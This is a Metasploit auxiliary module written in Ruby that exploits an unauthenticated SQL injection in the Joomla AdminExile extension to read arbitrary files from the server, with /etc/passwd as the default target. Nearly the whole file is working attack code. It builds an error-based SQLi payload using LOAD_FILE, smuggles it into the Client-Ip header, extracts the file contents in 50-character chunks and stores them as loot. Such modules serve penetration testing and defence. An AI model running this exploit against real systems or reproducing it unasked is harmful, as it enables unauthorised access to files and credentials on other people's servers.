##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Joomla AdminExile Unauthenticated Arbitrary File Read via SQLi',
      'Description'    => %q{

      This module attempts to read an arbitrary file from the file system using an unauthenticated
      SQL injection. A slightly misconfigured database is likely required in that the database
      user must have the FILE permission in order to read files. This is a common misconfiguration.
      },
      'References'     =>
        [
          ['URL', 'http://1337day.com/exploit/22881']
        ],
      'Author'         =>
        [
          'bperry',
        ],
      'License'        => 'VolatileMinds',
      'DisclosureDate' => "Nov 17 2014"
    ))

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The path to Joomla', '/']),
        OptString.new('FILEPATH', [true, 'The file to read', '/etc/passwd']),
      ], self.class)
  end

  def run
    left_marker = Rex::Text.rand_text_alpha(5)
    right_marker = Rex::Text.rand_text_alpha(5)

    val = -1
    data = ''
    i = 0
    while val != ''
      val = ''
      get_file_frag = "AND (SELECT 6283 FROM(SELECT COUNT(*),CONCAT(0x#{left_marker.unpack("H*")[0]},(MID((IFNULL(CAST(HEX(LOAD_FILE(0x#{datastore['FILEPATH'].unpack("H*")[0]})) AS CHAR),0x20)),#{50*i+1},50)),0x#{right_marker.unpack("H*")[0]},FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND \"tOZo\"=\"tOZo"
      res = send_injected_request(get_file_frag)
      val = $1 if res.headers['Status'] =~ /#{left_marker}(.*)#{right_marker}/
      vprint_status(val)
      data << val
      i = i + 1
    end

    data = [data].pack("H*")
    path = store_loot('joomla.file', 'binary/octet-stream', datastore['RHOST'], data, datastore['FILEPATH'])
    print_status ("File saved to #{path}.")
  end

  def send_injected_request(str)
    return send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'administrator', 'index.php'),
      'headers' => {
        'Client-Ip' => '127.0.0.1" ' + str
      }
    })
  end
end

